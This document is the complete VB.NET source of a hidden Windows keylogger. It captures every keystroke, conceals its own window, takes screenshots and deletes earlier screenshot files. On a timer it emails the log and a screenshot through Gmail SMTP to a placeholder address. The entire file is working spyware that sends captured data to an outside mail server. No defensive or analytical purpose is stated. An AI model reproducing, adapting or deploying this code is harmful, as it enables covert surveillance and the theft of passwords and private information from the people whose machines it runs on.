Imports System.Net.Mail, System.Net, System.IO, System.Diagnostics.Process, System.Management

Public Class KeyLogger

    Dim result As Integer
    Dim strin As String = Nothing
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

    Public Function GetCapslock() As Boolean
        ' Return Or Set the Capslock toggle.
        GetCapslock = CBool(GetKeyState(&H14) And 1)
    End Function

    Public Function GetShift() As Boolean
        ' Return Or Set the Capslock toggle.
        GetShift = CBool(GetAsyncKeyState(&H10))
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For i As Integer = 1 To 225
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                If GetCapslock() = True And GetShift() = True Then
                    Select Case (i)
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + ""
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + ""
                        Case 18
                            TextBox1.Text = TextBox1.Text + ""
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 20
                        Case 91 'windows key
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [PPM]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " (" + i.ToString + ") "
                    End Select
                End If

                If GetCapslock() = True And GetShift() = False Then
                    Select Case (i)
                        Case 91 'windows key
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + ""
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + ""
                        Case 18
                            TextBox1.Text = TextBox1.Text + ""
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [PPM]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " (" + i.ToString + ") "
                    End Select
                End If

                If GetCapslock() = False And GetShift() = True Then
                    Select Case (i)
                        Case 91 'windows key
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + " [<-] "
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + ""
                        Case 18
                            TextBox1.Text = TextBox1.Text + ""
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 20
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [PPM]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " (" + i.ToString + ") "
                    End Select
                End If

                If GetCapslock() = False And GetShift() = False Then
                    Select Case (i)
                        Case 1
                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + " [<-] "
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 91 'windows key
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + ""
                        Case 18
                            TextBox1.Text = TextBox1.Text + ""
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter] " + vbNewLine
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [PPM]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " (" + i.ToString + ") "
                    End Select
                End If

            End If
        Next i
    End Sub

    Private Sub KeyLogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False

        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(
                My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData,
                Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, "*.bmp")
                System.IO.File.Delete(foundFile)
            Next
        Catch
        End Try
    End Sub

    Private Sub SendMail_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMail.Tick
        sendmail2()
    End Sub

    Private Sub sendmail2()
        Try
            PictureBox2.Image = Nothing
            Label3.Text = Val(Label3.Text) + 1

            Dim bounds As Rectangle
            Dim screenshot As System.Drawing.Bitmap
            Dim graph As Graphics
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            PictureBox2.Image = screenshot

            PictureBox2.Image.Save(System.IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData, "screenshot" & Label3.Text & ".bmp"))
            PictureBox2.Image = Nothing
            Dim startupPath As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            Dim Mail As New MailMessage
            Dim attach As New Attachment(System.IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData, "screenshot" & Label3.Text & ".bmp"))

            Mail.Attachments.Add(attach)

            Mail.Subject = "LOGS"
            Mail.To.Add("youremail@gmail.com")
            Mail.From = New MailAddress("youremail@gmail.com")
            Mail.Body = TextBox1.Text

            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("youremail@gmail.com", "Password")
            SMTP.Port = "587"

            SMTP.Send(Mail)
        Catch
        End Try
    End Sub

End Class
